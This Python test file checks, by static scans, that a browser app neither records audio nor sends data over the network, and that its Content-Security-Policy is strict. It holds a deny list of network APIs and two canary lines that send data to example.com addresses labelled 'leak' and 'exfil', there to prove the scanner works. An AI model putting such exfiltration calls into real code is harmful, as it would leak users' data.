"""Merge-blocking: the browser (PWA) implementation carries the same no-audio /
no-egress guarantees as the Python core, enforced by static scans over ``pwa/``.

The Python gates (``tests/test_no_audio.py`` / ``tests/test_no_egress.py``) prove the
service never persists or transmits audio. The PWA is a second implementation of the
same product, so it needs the same merge-blocking gates in its own language:

  1. No-audio-persistence: no ``MediaRecorder`` / ``AudioWorklet`` / ``decodeAudioData``
     (the recording-capable Web Audio sinks), and the *only* ``mediaDevices`` use is the
     single ``getUserMedia({ audio: true })`` call that feeds the in-memory AnalyserNode.
  2. No-egress: no ``XMLHttpRequest`` / ``WebSocket`` / ``sendBeacon`` / ``EventSource``
     and no ``fetch(`` other than the service worker's same-origin cache passthrough.
  3. The page references no external (cross-origin) resources.
  4. A strict Content-Security-Policy meta locks the browser down to local-only.

A canary self-test proves the scanner actually bites: a synthetic file containing
``new WebSocket(`` must be flagged (see FIX-08's "gate self-test" idea).
"""

from __future__ import annotations

import re
from pathlib import Path

from conftest import ROOT

PWA_DIR = ROOT / "pwa"
INDEX_HTML = PWA_DIR / "index.html"

# The exact Web Audio APIs capable of turning a mic stream into stored/serialized audio.
# None are used by the level-only PWA, so we forbid them outright.
FORBIDDEN_AUDIO_TOKENS = ("MediaRecorder", "AudioWorklet", "decodeAudioData")

# Any of these lets a page open a wire. The PWA opens none of them.
FORBIDDEN_EGRESS_TOKENS = ("XMLHttpRequest", "WebSocket", "sendBeacon", "EventSource")

# The single sanctioned mic access: level-only, in-memory. Anything else is a violation.
ALLOWED_MEDIA_DEVICES = re.compile(
    r"navigator\.mediaDevices\.getUserMedia\(\{\s*audio:\s*true\s*\}\)"
)


def pwa_source_files() -> list[Path]:
    """Every first-party PWA script (``pwa/*.js`` incl. ``sw.js``); excludes ``*.test.mjs``."""
    return sorted(p for p in PWA_DIR.glob("*.js") if not p.name.endswith(".test.mjs"))


def scan_egress(text: str, name: str) -> list[str]:
    """Return egress violations in *text*. The one allowlisted case is ``sw.js``'s
    same-origin cache passthrough: ``fetch(e.request)`` inside the ``fetch`` handler."""
    hits: list[str] = []
    for token in FORBIDDEN_EGRESS_TOKENS:
        if token in text:
            hits.append(token)
    for lineno, line in enumerate(text.splitlines(), 1):
        if "fetch(" in line:
            # Allowlist: the service worker's cache-miss fallback re-fetches the app's own
            # (same-origin, CSP connect-src 'self') asset. Nothing else may call fetch(.
            if name == "sw.js" and "fetch(e.request)" in line:
                continue
            hits.append(f"fetch( at {name}:{lineno}")
    return hits


# --- 1. No audio persistence ------------------------------------------------------


def test_no_pwa_source_uses_recording_api():
    offenders: dict[str, list[str]] = {}
    for path in pwa_source_files():
        text = path.read_text(encoding="utf-8")
        hits = [tok for tok in FORBIDDEN_AUDIO_TOKENS if tok in text]
        if hits:
            offenders[path.name] = hits
    assert not offenders, f"recording-capable audio APIs present in PWA: {offenders}"


def test_only_sanctioned_media_devices_use():
    """``mediaDevices`` may appear only as the exact level-only getUserMedia call."""
    offenders: list[str] = []
    for path in pwa_source_files():
        for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if "mediaDevices" in line and not ALLOWED_MEDIA_DEVICES.search(line):
                offenders.append(f"{path.name}:{lineno}: {line.strip()}")
    assert not offenders, f"unexpected mediaDevices usage: {offenders}"


def test_sanctioned_media_call_is_present_and_singular():
    """Guard against the gate silently passing because the call was renamed/removed:
    exactly one sanctioned getUserMedia call exists, and it lives in app.js."""
    occurrences = [
        path.name
        for path in pwa_source_files()
        for line in path.read_text(encoding="utf-8").splitlines()
        if ALLOWED_MEDIA_DEVICES.search(line)
    ]
    assert occurrences == ["app.js"], f"expected one getUserMedia in app.js, got {occurrences}"


# --- 2. No egress -----------------------------------------------------------------


def test_no_pwa_source_makes_network_egress():
    offenders: dict[str, list[str]] = {}
    for path in pwa_source_files():
        hits = scan_egress(path.read_text(encoding="utf-8"), path.name)
        if hits:
            offenders[path.name] = hits
    assert not offenders, f"network egress APIs present in PWA: {offenders}"


def test_index_html_references_no_external_resources():
    """Every src/href in index.html is relative — the app is fully local."""
    html = INDEX_HTML.read_text(encoding="utf-8")
    external = re.findall(r'(?:src|href)\s*=\s*["\']https?://[^"\']+', html)
    assert not external, f"index.html references external resources: {external}"


# --- 3. Canary: prove the scanner actually bites ----------------------------------


def test_egress_scanner_flags_a_planted_violation(tmp_path):
    canary = tmp_path / "canary.js"
    canary.write_text('const s = new WebSocket("wss://example.com/leak");\n', encoding="utf-8")
    hits = scan_egress(canary.read_text(encoding="utf-8"), canary.name)
    assert "WebSocket" in hits, "egress scanner failed to flag a planted WebSocket — gate is dead"


def test_egress_scanner_flags_a_planted_fetch(tmp_path):
    canary = tmp_path / "canary.js"
    canary.write_text('fetch("https://example.com/exfil", { method: "POST" });\n', encoding="utf-8")
    hits = scan_egress(canary.read_text(encoding="utf-8"), canary.name)
    assert any(h.startswith("fetch(") for h in hits), "scanner failed to flag a planted fetch("


# --- 4. Content-Security-Policy ---------------------------------------------------


def _csp_content() -> str:
    html = INDEX_HTML.read_text(encoding="utf-8")
    # The content value itself contains single quotes (e.g. 'none'), so match on the
    # attribute delimiter with a backreference rather than excluding both quote types.
    match = re.search(
        r'<meta\s+http-equiv=(["\'])Content-Security-Policy\1\s+content=(["\'])(.*?)\2',
        html,
        re.IGNORECASE,
    )
    assert match, "index.html is missing a Content-Security-Policy <meta> tag"
    return match.group(3)


def test_index_html_has_strict_csp():
    csp = _csp_content()
    assert "default-src 'none'" in csp, f"CSP must deny by default: {csp}"
    assert "script-src 'self'" in csp, f"CSP must scope scripts to 'self': {csp}"
    assert "manifest-src 'self'" in csp, f"CSP must scope the manifest to 'self': {csp}"
    assert "img-src 'self'" in csp, f"CSP must scope images to 'self': {csp}"


def test_csp_connect_src_is_local_only():
    """connect-src may only be 'none' or 'self' (same-origin SW passthrough); never a host."""
    csp = _csp_content()
    match = re.search(r"connect-src\s+([^;]+)", csp)
    assert match, f"CSP must set connect-src explicitly: {csp}"
    sources = match.group(1).split()
    assert set(sources) <= {"'none'", "'self'"}, f"connect-src allows egress: {sources}"
